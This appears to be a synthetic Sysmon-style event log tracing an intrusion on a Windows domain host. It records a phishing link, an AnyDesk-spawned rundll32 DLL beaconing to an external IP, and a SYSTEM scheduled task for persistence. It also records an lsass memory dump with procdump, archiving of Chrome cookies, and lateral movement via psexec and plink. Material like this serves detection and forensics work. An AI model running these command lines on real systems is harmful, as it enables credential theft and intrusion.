UtcTime,EventID,Image,CommandLine,CurrentDirectory,User,ParentImage,ParentCommandLine,DestinationIp,DestinationPort,Hashes,TargetFilename
2026-02-12 17:03:39.102,1,C:\Program Files\Google\Chrome\Application\chrome.exe,"chrome.exe https://help-blackridge.com/ticket/84721/confirm",C:\Users\marina.ko\,BLACKRIDGE\marina.ko,C:\Windows\explorer.exe,explorer.exe,,,SHA256=9f1f7c1b,
2026-02-12 17:03:45.884,3,C:\Program Files\Google\Chrome\Application\chrome.exe,"chrome.exe --type=renderer",C:\Users\marina.ko\,BLACKRIDGE\marina.ko,C:\Program Files\Google\Chrome\Application\chrome.exe,,198.51.100.27,443,SHA256=9f1f7c1b,
2026-02-12 17:40:18.032,1,C:\Windows\System32\cmd.exe,"cmd.exe /c rundll32.exe C:\ProgramData\EdgeAuth\authui.dll,Entry",C:\Windows\System32\,BLACKRIDGE\helpdesk.svc,C:\Program Files\AnyDesk\AnyDesk.exe,"AnyDesk.exe --service",,,SHA256=88b3ae2f,
2026-02-12 17:40:18.101,7,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\ProgramData\EdgeAuth\authui.dll,Entry",C:\Windows\System32\,BLACKRIDGE\helpdesk.svc,C:\Windows\System32\cmd.exe,,,,SHA256=6a8201d2,
2026-02-12 17:40:18.841,3,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\ProgramData\EdgeAuth\authui.dll,Entry",C:\Windows\System32\,BLACKRIDGE\helpdesk.svc,C:\Windows\System32\cmd.exe,,185.193.88.17,443,SHA256=6a8201d2,
2026-02-12 17:43:09.221,1,C:\Windows\System32\schtasks.exe,"schtasks /Create /SC ONLOGON /TN EdgeAutoUpdater /TR ""rundll32 C:\ProgramData\EdgeAuth\authui.dll,Entry"" /RU SYSTEM /F",C:\Windows\System32\,BLACKRIDGE\helpdesk.svc,C:\Windows\System32\cmd.exe,,,,SHA256=a203af11,
2026-02-12 17:54:42.008,1,C:\Windows\System32\procdump64.exe,"procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\debug\lsass_0212.dmp",C:\Users\helpdesk.svc\Downloads\,BLACKRIDGE\helpdesk.svc,C:\Windows\System32\cmd.exe,,,,SHA256=4fe2bb10,C:\ProgramData\debug\lsass_0212.dmp
2026-02-12 17:58:03.901,11,C:\Windows\System32\7z.exe,"7z.exe a C:\ProgramData\debug\browser_cache.7z C:\Users\marina.ko\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",C:\Program Files\7-Zip\,BLACKRIDGE\helpdesk.svc,C:\Windows\System32\cmd.exe,,,,SHA256=1032ab3c,C:\ProgramData\debug\browser_cache.7z
2026-02-12 18:11:22.222,3,C:\Program Files\Google\Chrome\Application\chrome.exe,"chrome.exe https://portal.azure.com/",C:\Users\marina.ko\,BLACKRIDGE\marina.ko,C:\Windows\explorer.exe,,10.10.10.10,443,SHA256=9f1f7c1b,
2026-02-12 19:21:44.092,1,C:\Windows\System32\psexec.exe,"psexec.exe \\WIN-FS01 -u BLACKRIDGE\helpdesk.svc cmd /c whoami && hostname",C:\Windows\System32\,BLACKRIDGE\helpdesk.svc,C:\Windows\System32\cmd.exe,,,,SHA256=99f8ab2c,
2026-02-12 19:39:12.220,1,C:\Windows\System32\cmd.exe,"cmd.exe /c net use \\WIN-FS01\Finance /user:BLACKRIDGE\helpdesk.svc ********",C:\Windows\System32\,BLACKRIDGE\helpdesk.svc,C:\Windows\System32\psexec.exe,,,,SHA256=88b3ae2f,
2026-02-12 20:07:51.877,1,C:\Program Files\PuTTY\plink.exe,"plink.exe -batch -i C:\ProgramData\edge.pem admin@10.20.9.11",C:\Program Files\PuTTY\,BLACKRIDGE\helpdesk.svc,C:\Windows\System32\cmd.exe,,,,SHA256=bc892faa,
